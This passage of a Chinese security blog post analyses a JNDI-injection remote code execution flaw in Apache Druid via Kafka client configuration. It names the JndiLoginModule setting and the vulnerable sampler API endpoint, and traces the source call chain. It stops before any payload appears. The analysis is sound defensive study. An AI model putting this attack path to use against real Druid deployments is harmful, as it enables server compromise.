    <content type="html"><![CDATA[<h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h4 id="Apache-Kafka"><a href="#Apache-Kafka" class="headerlink" title="Apache Kafka"></a>Apache Kafka</h4><p>Kafka是由Apache软件基金会开发的一个开源流处理平台，由Scala和Java编写。该项目的目标是为处理实时数据提供一个统一、高吞吐、低延迟的平台。其持久化层本质上是一个“按照分布式事务日志架构的大规模发布&#x2F;订阅消息队列”，这使它作为企业级基础设施来处理流式数据非常有价值。</p><p>此漏洞允许服务器连接到攻击者的 LDAP 服务器并反序列化 LDAP 响应，攻击者可以使用它在 Kafka 连接服务器上执行 java 反序列化小工具链。当类路径中有小工具时，攻击者可以造成不可信数据的无限制反序列化（或）RCE 漏洞。</p><p>此漏洞利用的前提是：需要访问 Kafka Connect worker，并能够使用任意 Kafka 客户端 SASL JAAS 配置和基于 SASL 的安全协议在其上创建&#x2F;修改连接器。 自 Apache Kafka 2.3.0 以来，这在 Kafka Connect 集群上是可能的。 通过 Kafka Connect REST API 配置连接器时，经过身份验证的操作员可以将连接器的任何 Kafka 客户端的 <code>sasl.jaas.config</code> 属性设置为“com.sun.security.auth.module.JndiLoginModule”，它可以是通过“producer.override.sasl.jaas.config”,“consumer.override.sasl.jaas.config”或“admin.override.sasl.jaas.config”属性完成。</p><h4 id="Apache-Druid"><a href="#Apache-Druid" class="headerlink" title="Apache Druid"></a>Apache Druid</h4><p>Apache Druid是一个高性能的实时大数据分析引擎，支持快速数据摄取、实时查询和数据可视化。它主要用于OLAP（在线分析处理）场景，能处理PB级别的数据。Druid具有高度可扩展、低延迟和高吞吐量的特点，广泛应用于实时监控、事件驱动分析、用户行为分析、网络安全等领域。通过使用Druid，企业和开发者可以快速获得实时分析结果，提升决策效率。</p><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>Apache Druid可添加Apache Kafka数据，存在Apache Kafka导致的JNDI注入漏洞，造成远程代码执行</p><h4 id="漏洞影响范围"><a href="#漏洞影响范围" class="headerlink" title="漏洞影响范围"></a>漏洞影响范围</h4><p>Apache Druid &lt;&#x3D; 25.0</p><h2 id="二、KafkaConsumer"><a href="#二、KafkaConsumer" class="headerlink" title="二、KafkaConsumer"></a>二、KafkaConsumer</h2><p>上篇讲到Producer&lt;String, String&gt; producer &#x3D; new KafkaProducer&lt;&gt;(props); 可造成JNDI注入</p><p>org.apache.kafka.clients.consumer.KafkaConsumer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">KafkaConsumer</span><span class="hljs-params">(Map&lt;String, Object&gt; configs)</span> &#123;<br>    <span class="hljs-built_in">this</span>((Map)configs, (Deserializer)<span class="hljs-literal">null</span>, (Deserializer)<span class="hljs-literal">null</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">KafkaConsumer</span><span class="hljs-params">(Properties properties)</span> &#123;<br>    <span class="hljs-built_in">this</span>((Properties)properties, (Deserializer)<span class="hljs-literal">null</span>, (Deserializer)<span class="hljs-literal">null</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">KafkaConsumer</span><span class="hljs-params">(Properties properties, Deserializer&lt;K&gt; keyDeserializer, Deserializer&lt;V&gt; valueDeserializer)</span> &#123;<br>    <span class="hljs-built_in">this</span>(Utils.propsToMap(properties), keyDeserializer, valueDeserializer);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">KafkaConsumer</span><span class="hljs-params">(Map&lt;String, Object&gt; configs, Deserializer&lt;K&gt; keyDeserializer, Deserializer&lt;V&gt; valueDeserializer)</span> &#123;<br>    <span class="hljs-built_in">this</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConsumerConfig</span>(ConsumerConfig.appendDeserializerToConfig(configs, keyDeserializer, valueDeserializer)), keyDeserializer, valueDeserializer);<br>&#125;<br><br><span class="hljs-comment">//最终调用至此构造方法</span><br>KafkaConsumer(ConsumerConfig config, Deserializer&lt;K&gt; keyDeserializer, Deserializer&lt;V&gt; valueDeserializer) &#123;<br>    <span class="hljs-built_in">this</span>.closed = <span class="hljs-literal">false</span>;<br>    <span class="hljs-built_in">this</span>.currentThread = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicLong</span>(-<span class="hljs-number">1L</span>);<br>    <span class="hljs-built_in">this</span>.refcount = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">GroupRebalanceConfig</span> <span class="hljs-variable">groupRebalanceConfig</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GroupRebalanceConfig</span>(config, ProtocolType.CONSUMER);<br>        <span class="hljs-built_in">this</span>.groupId = Optional.ofNullable(groupRebalanceConfig.groupId);<br>        <span class="hljs-built_in">this</span>.clientId = config.getString(<span class="hljs-string">&quot;client.id&quot;</span>);<br>        LogContext logContext;<br>        <span class="hljs-keyword">if</span> (groupRebalanceConfig.groupInstanceId.isPresent()) &#123;<br>            logContext = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LogContext</span>(<span class="hljs-string">&quot;[Consumer instanceId=&quot;</span> + (String)groupRebalanceConfig.groupInstanceId.get() + <span class="hljs-string">&quot;, clientId=&quot;</span> + <span class="hljs-built_in">this</span>.clientId + <span class="hljs-string">&quot;, groupId=&quot;</span> + (String)<span class="hljs-built_in">this</span>.groupId.orElse(<span class="hljs-string">&quot;null&quot;</span>) + <span class="hljs-string">&quot;] &quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            logContext = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LogContext</span>(<span class="hljs-string">&quot;[Consumer clientId=&quot;</span> + <span class="hljs-built_in">this</span>.clientId + <span class="hljs-string">&quot;, groupId=&quot;</span> + (String)<span class="hljs-built_in">this</span>.groupId.orElse(<span class="hljs-string">&quot;null&quot;</span>) + <span class="hljs-string">&quot;] &quot;</span>);<br>        &#125;<br><br>        <span class="hljs-built_in">this</span>.log = logContext.logger(<span class="hljs-built_in">this</span>.getClass());<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">enableAutoCommit</span> <span class="hljs-operator">=</span> config.maybeOverrideEnableAutoCommit();<br>        <span class="hljs-built_in">this</span>.groupId.ifPresent((groupIdStr) -&gt; &#123;<br>            <span class="hljs-keyword">if</span> (groupIdStr.isEmpty()) &#123;<br>                <span class="hljs-built_in">this</span>.log.warn(<span class="hljs-string">&quot;Support for using the empty group id by consumers is deprecated and will be removed in the next major release.&quot;</span>);<br>            &#125;<br><br>        &#125;);<br>        <span class="hljs-built_in">this</span>.log.debug(<span class="hljs-string">&quot;Initializing the Kafka consumer&quot;</span>);<br>        <span class="hljs-built_in">this</span>.requestTimeoutMs = (<span class="hljs-type">long</span>)config.getInt(<span class="hljs-string">&quot;request.timeout.ms&quot;</span>);<br>        <span class="hljs-built_in">this</span>.defaultApiTimeoutMs = config.getInt(<span class="hljs-string">&quot;default.api.timeout.ms&quot;</span>);<br>        <span class="hljs-built_in">this</span>.time = Time.SYSTEM;<br>        <span class="hljs-built_in">this</span>.metrics = buildMetrics(config, <span class="hljs-built_in">this</span>.time, <span class="hljs-built_in">this</span>.clientId);<br>        <span class="hljs-built_in">this</span>.retryBackoffMs = config.getLong(<span class="hljs-string">&quot;retry.backoff.ms&quot;</span>);<br>        List&lt;ConsumerInterceptor&lt;K, V&gt;&gt; interceptorList = config.getConfiguredInstances(<span class="hljs-string">&quot;interceptor.classes&quot;</span>, ConsumerInterceptor.class, Collections.singletonMap(<span class="hljs-string">&quot;client.id&quot;</span>, <span class="hljs-built_in">this</span>.clientId));<br>        <span class="hljs-built_in">this</span>.interceptors = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConsumerInterceptors</span>(interceptorList);<br>        <span class="hljs-keyword">if</span> (keyDeserializer == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-built_in">this</span>.keyDeserializer = (Deserializer)config.getConfiguredInstance(<span class="hljs-string">&quot;key.deserializer&quot;</span>, Deserializer.class);<br>            <span class="hljs-built_in">this</span>.keyDeserializer.configure(config.originals(Collections.singletonMap(<span class="hljs-string">&quot;client.id&quot;</span>, <span class="hljs-built_in">this</span>.clientId)), <span class="hljs-literal">true</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            config.ignore(<span class="hljs-string">&quot;key.deserializer&quot;</span>);<br>            <span class="hljs-built_in">this</span>.keyDeserializer = keyDeserializer;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (valueDeserializer == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-built_in">this</span>.valueDeserializer = (Deserializer)config.getConfiguredInstance(<span class="hljs-string">&quot;value.deserializer&quot;</span>, Deserializer.class);<br>            <span class="hljs-built_in">this</span>.valueDeserializer.configure(config.originals(Collections.singletonMap(<span class="hljs-string">&quot;client.id&quot;</span>, <span class="hljs-built_in">this</span>.clientId)), <span class="hljs-literal">false</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            config.ignore(<span class="hljs-string">&quot;value.deserializer&quot;</span>);<br>            <span class="hljs-built_in">this</span>.valueDeserializer = valueDeserializer;<br>        &#125;<br><br>        <span class="hljs-type">OffsetResetStrategy</span> <span class="hljs-variable">offsetResetStrategy</span> <span class="hljs-operator">=</span> OffsetResetStrategy.valueOf(config.getString(<span class="hljs-string">&quot;auto.offset.reset&quot;</span>).toUpperCase(Locale.ROOT));<br>        <span class="hljs-built_in">this</span>.subscriptions = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SubscriptionState</span>(logContext, offsetResetStrategy);<br>        <span class="hljs-type">ClusterResourceListeners</span> <span class="hljs-variable">clusterResourceListeners</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.configureClusterResourceListeners(keyDeserializer, valueDeserializer, <span class="hljs-built_in">this</span>.metrics.reporters(), interceptorList);<br>        <span class="hljs-built_in">this</span>.metadata = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConsumerMetadata</span>(<span class="hljs-built_in">this</span>.retryBackoffMs, config.getLong(<span class="hljs-string">&quot;metadata.max.age.ms&quot;</span>), !config.getBoolean(<span class="hljs-string">&quot;exclude.internal.topics&quot;</span>), config.getBoolean(<span class="hljs-string">&quot;allow.auto.create.topics&quot;</span>), <span class="hljs-built_in">this</span>.subscriptions, logContext, clusterResourceListeners);<br>        List&lt;InetSocketAddress&gt; addresses = ClientUtils.parseAndValidateAddresses(config.getList(<span class="hljs-string">&quot;bootstrap.servers&quot;</span>), config.getString(<span class="hljs-string">&quot;client.dns.lookup&quot;</span>));<br>        <span class="hljs-built_in">this</span>.metadata.bootstrap(addresses);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">metricGrpPrefix</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;consumer&quot;</span>;<br>        <span class="hljs-type">FetcherMetricsRegistry</span> <span class="hljs-variable">metricsRegistry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FetcherMetricsRegistry</span>(Collections.singleton(<span class="hljs-string">&quot;client-id&quot;</span>), metricGrpPrefix);<br>        <span class="hljs-comment">//调用至ClientUtils.createChannelBuilder 接下来调用链与一相同，不再赘述</span><br>        <span class="hljs-type">ChannelBuilder</span> <span class="hljs-variable">channelBuilder</span> <span class="hljs-operator">=</span> ClientUtils.createChannelBuilder(config, <span class="hljs-built_in">this</span>.time, logContext);<br>        <span class="hljs-built_in">this</span>.isolationLevel = IsolationLevel.valueOf(config.getString(<span class="hljs-string">&quot;isolation.level&quot;</span>).toUpperCase(Locale.ROOT));<br>        <span class="hljs-type">Sensor</span> <span class="hljs-variable">throttleTimeSensor</span> <span class="hljs-operator">=</span> Fetcher.throttleTimeSensor(<span class="hljs-built_in">this</span>.metrics, metricsRegistry);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">heartbeatIntervalMs</span> <span class="hljs-operator">=</span> config.getInt(<span class="hljs-string">&quot;heartbeat.interval.ms&quot;</span>);<br>        <span class="hljs-type">ApiVersions</span> <span class="hljs-variable">apiVersions</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApiVersions</span>();<br>        <span class="hljs-type">NetworkClient</span> <span class="hljs-variable">netClient</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NetworkClient</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Selector</span>(config.getLong(<span class="hljs-string">&quot;connections.max.idle.ms&quot;</span>), <span class="hljs-built_in">this</span>.metrics, <span class="hljs-built_in">this</span>.time, metricGrpPrefix, channelBuilder, logContext), <span class="hljs-built_in">this</span>.metadata, <span class="hljs-built_in">this</span>.clientId, <span class="hljs-number">100</span>, config.getLong(<span class="hljs-string">&quot;reconnect.backoff.ms&quot;</span>), config.getLong(<span class="hljs-string">&quot;reconnect.backoff.max.ms&quot;</span>), config.getInt(<span class="hljs-string">&quot;send.buffer.bytes&quot;</span>), config.getInt(<span class="hljs-string">&quot;receive.buffer.bytes&quot;</span>), config.getInt(<span class="hljs-string">&quot;request.timeout.ms&quot;</span>), config.getLong(<span class="hljs-string">&quot;socket.connection.setup.timeout.ms&quot;</span>), config.getLong(<span class="hljs-string">&quot;socket.connection.setup.timeout.max.ms&quot;</span>), <span class="hljs-built_in">this</span>.time, <span class="hljs-literal">true</span>, apiVersions, throttleTimeSensor, logContext);<br>    ......<br>    &#125; <span class="hljs-keyword">catch</span> (Throwable var18) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.log != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-built_in">this</span>.close(<span class="hljs-number">0L</span>, <span class="hljs-literal">true</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">KafkaException</span>(<span class="hljs-string">&quot;Failed to construct kafka consumer&quot;</span>, var18);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="三、Apache-Druid环境配置"><a href="#三、Apache-Druid环境配置" class="headerlink" title="三、Apache Druid环境配置"></a>三、Apache Druid环境配置</h2><p>1、修改jvm.config，远程debug</p><p>目录为apache-druid-xxx\conf\druid\single-server\micro-quickstart\coordinator-overlord\jvm.config</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=<span class="hljs-number">5005</span><br>suspend=n表示的是启动Java应用时是否立即进入调试模式;<br>suspend=y表示启动即暂停，suspend=n则表示启动时不需要暂停;<br>address=*:<span class="hljs-number">5005</span>表示的是Debug监听的服务地址和端口，根据需求修改，上述配置会监听到<span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><br></code></pre></td></tr></table></figure><p><img src="/image/kafkadruidimage-0.png" alt="img"></p><p>2、启动Apache Druid</p><p>运行bin&#x2F;下start-micro-quickstart</p><p><img src="/image/kafkadruidimage-1.png" alt="img"></p><p>访问ip:8888,成功访问</p><p><img src="/image/kafkadruidimage-2.png" alt="img"></p><h2 id="四、漏洞分析"><a href="#四、漏洞分析" class="headerlink" title="四、漏洞分析"></a>四、漏洞分析</h2><h3 id="前端输入"><a href="#前端输入" class="headerlink" title="前端输入"></a>前端输入</h3><p>Apache Druid添加kafka</p><p><img src="/image/kafkadruidimage-3.png" alt="img"></p><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>存在漏洞API接口为&#x2F;druid&#x2F;indexer&#x2F;v1&#x2F;sampler</p><p>接口类如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//路径</span><br><span class="hljs-meta">@Path(&quot;/druid/indexer/v1/sampler&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SamplerResource</span>&#123;<br>  <span class="hljs-comment">//post方法  </span><br>  <span class="hljs-meta">@POST</span><br>  <span class="hljs-comment">//指定http请求的MIME类型为application/json</span><br>  <span class="hljs-meta">@Consumes(MediaType.APPLICATION_JSON)</span><br>  <span class="hljs-comment">//指定http响应的MIME类型application/json</span><br>  <span class="hljs-meta">@Produces(MediaType.APPLICATION_JSON)</span><br>  <span class="hljs-meta">@ResourceFilters(StateResourceFilter.class)</span><br>  <span class="hljs-keyword">public</span> SamplerResponse <span class="hljs-title function_">post</span><span class="hljs-params">(<span class="hljs-keyword">final</span> SamplerSpec sampler)</span>&#123;<br>    <span class="hljs-comment">//Preconditions.checkNotNull(sampler, &quot;Request body cannot be empty&quot;) 判断sampler是否为空</span><br>    <span class="hljs-comment">//调用sampler#sample()方法</span><br>    <span class="hljs-keyword">return</span> Preconditions.checkNotNull(sampler, <span class="hljs-string">&quot;Request body cannot be empty&quot;</span>).sample();<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>org.apache.druid.client.indexing.SamplerSpec为接口，声明方法sample()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//用于配置JSON 序列化和反序列化过程中使用哪种类型信息。该注解是实现多态类型的必要注解。</span><br><span class="hljs-comment">//配置此即可在 json 中通过 type 定义反序列化为子类</span><br><span class="hljs-meta">@JsonTypeInfo(use = JsonTypeInfo.Id.NAME, property = &quot;type&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">SamplerSpec</span>&#123;<br>  SamplerResponse <span class="hljs-title function_">sample</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/image/kafkadruidimage-4.png" alt="img"></p><p>org.apache.druid.indexing.seekablestream.SeekableStreamSamplerSpec实现接口SamplerSpec</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">SeekableStreamSamplerSpec</span><span class="hljs-params">(</span><br><span class="hljs-params">  //ingestionSpec</span><br><span class="hljs-params">  <span class="hljs-keyword">final</span> SeekableStreamSupervisorSpec ingestionSpec,</span><br><span class="hljs-params">  <span class="hljs-meta">@Nullable</span> <span class="hljs-keyword">final</span> SamplerConfig samplerConfig,</span><br><span class="hljs-params">  <span class="hljs-keyword">final</span> InputSourceSampler inputSourceSampler</span><br><span class="hljs-params">)</span><br>&#123;<br><span class="hljs-comment">//ingestionSpec不为空  dataSchema为ingestionSpec.dataSchema</span><br><span class="hljs-built_in">this</span>.dataSchema = Preconditions.checkNotNull(ingestionSpec, <span class="hljs-string">&quot;[spec] is required&quot;</span>).getDataSchema();<br><span class="hljs-comment">//ioConfig不为空</span><br><span class="hljs-built_in">this</span>.ioConfig = Preconditions.checkNotNull(ingestionSpec.getIoConfig(), <span class="hljs-string">&quot;[spec.ioConfig] is required&quot;</span>);<br><span class="hljs-built_in">this</span>.tuningConfig = ingestionSpec.getTuningConfig();<br><span class="hljs-built_in">this</span>.samplerConfig = samplerConfig == <span class="hljs-literal">null</span> ? SamplerConfig.empty() : samplerConfig;<br><span class="hljs-built_in">this</span>.inputSourceSampler = inputSourceSampler;<br>&#125;<br><span class="hljs-comment">//API接口中sample()调用至此</span><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> SamplerResponse <span class="hljs-title function_">sample</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-keyword">final</span> InputSource inputSource;<br><span class="hljs-keyword">final</span> InputFormat inputFormat;<br><span class="hljs-keyword">if</span> (dataSchema.getParser() != <span class="hljs-literal">null</span>) &#123;<br>  inputSource = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FirehoseFactoryToInputSourceAdaptor</span>(<br>      <span class="hljs-keyword">new</span> <span class="hljs-title class_">SeekableStreamSamplerFirehoseFactory</span>(),<br>      dataSchema.getParser()<br>  );<br>  inputFormat = <span class="hljs-literal">null</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  RecordSupplier&lt;PartitionIdType, SequenceOffsetType, RecordType&gt; recordSupplier;<br>  <span class="hljs-comment">//调用至子类KafkaSamplerSpeccreateRecordSupplier()</span><br>  <span class="hljs-keyword">try</span> &#123;<br>    recordSupplier = createRecordSupplier();<br>  &#125;<br>  <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SamplerException</span>(e, <span class="hljs-string">&quot;Unable to create RecordSupplier: %s&quot;</span>, Throwables.getRootCause(e).getMessage());<br>  &#125;<br><br>  inputSource = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RecordSupplierInputSource</span>&lt;&gt;(<br>      ioConfig.getStream(),<br>      recordSupplier,<br>      ioConfig.isUseEarliestSequenceNumber(),<br>      samplerConfig.getTimeoutMs() &lt;= <span class="hljs-number">0</span> ? <span class="hljs-literal">null</span> : samplerConfig.getTimeoutMs()<br>  );<br>  inputFormat = Preconditions.checkNotNull(<br>      ioConfig.getInputFormat(),<br>      <span class="hljs-string">&quot;[spec.ioConfig.inputFormat] is required&quot;</span><br>  );<br>&#125;<br><br><span class="hljs-keyword">return</span> inputSourceSampler.sample(inputSource, inputFormat, dataSchema, samplerConfig);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/image/kafkadruidimage-5.png" alt="img"></p><p>org.apache.druid.indexing.kafka.KafkaSamplerSpec继承类SeekableStreamSamplerSpec</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//继承类SeekableStreamSamplerSpec</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">KafkaSamplerSpec</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">SeekableStreamSamplerSpec</span>&#123;<br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ObjectMapper objectMapper;<br><br>  <span class="hljs-meta">@JsonCreator</span><br>  <span class="hljs-keyword">public</span> <span class="hljs-title function_">KafkaSamplerSpec</span><span class="hljs-params">(</span><br><span class="hljs-params">      //将 json 中 spec 转换为KafkaSupervisorSpec ingestionSpec属性</span><br><span class="hljs-params">      <span class="hljs-meta">@JsonProperty(&quot;spec&quot;)</span> <span class="hljs-keyword">final</span> KafkaSupervisorSpec ingestionSpec,</span><br><span class="hljs-params">      //将 json 中 samplerConfig 转换为SamplerConfig samplerConfig属性</span><br><span class="hljs-params">      <span class="hljs-meta">@JsonProperty(&quot;samplerConfig&quot;)</span> <span class="hljs-meta">@Nullable</span> <span class="hljs-keyword">final</span> SamplerConfig samplerConfig,</span><br><span class="hljs-params">      //值为空注入默认值</span><br><span class="hljs-params">      <span class="hljs-meta">@JacksonInject</span> InputSourceSampler inputSourceSampler,</span><br><span class="hljs-params">      <span class="hljs-meta">@JacksonInject</span> ObjectMapper objectMapper</span><br><span class="hljs-params">  )</span>&#123;<br>    <span class="hljs-comment">//调用父类构造方法  </span><br>    <span class="hljs-comment">//ingestionSpec为 json 中 spec </span><br>    <span class="hljs-built_in">super</span>(ingestionSpec, samplerConfig, inputSourceSampler);<br><br>    <span class="hljs-built_in">this</span>.objectMapper = objectMapper;<br>  &#125;<br><br>  <span class="hljs-comment">//调用至此方法  </span><br>  <span class="hljs-meta">@Override</span><br>  <span class="hljs-keyword">protected</span> KafkaRecordSupplier <span class="hljs-title function_">createRecordSupplier</span><span class="hljs-params">()</span><br>  &#123;<br>    <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">currCtxCl</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br>    <span class="hljs-keyword">try</span> &#123;<br>      Thread.currentThread().setContextClassLoader(getClass().getClassLoader());<br>      <span class="hljs-comment">//声明map  将ioConfig中数据添加至map</span><br>      <span class="hljs-keyword">final</span> Map&lt;String, Object&gt; props = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(((KafkaSupervisorIOConfig) ioConfig).getConsumerProperties());<br>  <span class="hljs-comment">//向map中插入值</span><br>      props.put(<span class="hljs-string">&quot;enable.auto.commit&quot;</span>, <span class="hljs-string">&quot;false&quot;</span>);<br>      props.put(<span class="hljs-string">&quot;auto.offset.reset&quot;</span>, <span class="hljs-string">&quot;none&quot;</span>);<br>      props.put(<span class="hljs-string">&quot;request.timeout.ms&quot;</span>, Integer.toString(samplerConfig.getTimeoutMs()));<br>      <span class="hljs-comment">//new KafkaRecordSupplier  </span><br>      <span class="hljs-comment">//proos为前面声明的map   objectMapper   ioConfig为ingestionSpec中ioConfig</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">KafkaRecordSupplier</span>(props, objectMapper, ((KafkaSupervisorIOConfig) 